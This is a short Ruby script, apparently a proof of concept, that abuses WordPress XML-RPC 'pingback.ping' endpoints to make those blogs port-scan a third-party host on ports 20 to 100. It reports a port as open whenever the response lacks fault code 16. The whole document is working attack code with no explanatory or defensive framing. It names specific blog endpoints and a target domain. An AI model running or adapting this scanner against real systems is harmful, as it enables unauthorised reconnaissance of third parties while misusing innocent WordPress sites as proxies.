require "typhoeus"

def generate_pingback_xml (target, valid_blog_post)
  xml = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
  xml << "<methodCall>"
  xml << "<methodName>pingback.ping</methodName>"
  xml << "<params>"
  xml << "<param><value><string>#{target}</string></value></param>"
  xml << "<param><value><string>#{valid_blog_post}</string></value></param>"
  xml << "</params>"
  xml << "</methodCall>"
  xml
end

def generate_requests(hydra, xml_rpcs, valid_blog_post, target)
  (20..100).each do |i|
    random = (0...8).map{65.+(rand(26)).chr}.join
    url = "#{target}:#{i}/#{random}/"
    xml = generate_pingback_xml(url, valid_blog_post)
    request = Typhoeus::Request.new(xml_rpcs.sample, :body => xml, :method => :post)
    request.on_complete do |response|
      # Closed: <value><int>16</int></value>
      closed_match = response.body.match(/<value><int>16<\/int><\/value>/)
      if closed_match.nil?
        puts "Port #{i} is open"
      end
    end
    hydra.queue(request)
  end
end

hydra = Typhoeus::Hydra.new(:max_concurrency => 10)
xml_rpcs = %w(http://10.211.55.8/wordpress/xmlrpc.php http://192.168.1.6/wordpress/xmlrpc.php)
valid_blog_post = "http://10.211.55.8/wordpress/blog/2012/09/15/hello-world/"
target = "http://www.firefart.net"
generate_requests(hydra, xml_rpcs, valid_blog_post, target)
hydra.run
